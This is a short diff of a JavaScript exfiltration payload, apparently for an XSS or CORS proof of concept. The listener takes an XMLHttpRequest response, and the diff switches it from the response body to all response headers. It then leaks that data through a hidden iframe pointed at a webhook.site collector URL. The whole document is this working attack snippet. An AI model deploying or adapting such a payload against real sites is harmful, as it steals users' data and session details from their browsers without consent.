@@ -1,7 +1,7 @@
 function reqListener () {
     var encoded = encodeURI(this.responseText);
     var b64 = btoa(this.responseText);
-    var raw = this.responseText;
+    var raw = this.getAllResponseHeaders();
     var iframe = document.createElement('iframe');
 	iframe.style.display = "none";
 	iframe.src = "https://webhook.site/95008403-a846-494a-8d4c-70aa6246bcdb/?aa="+raw;
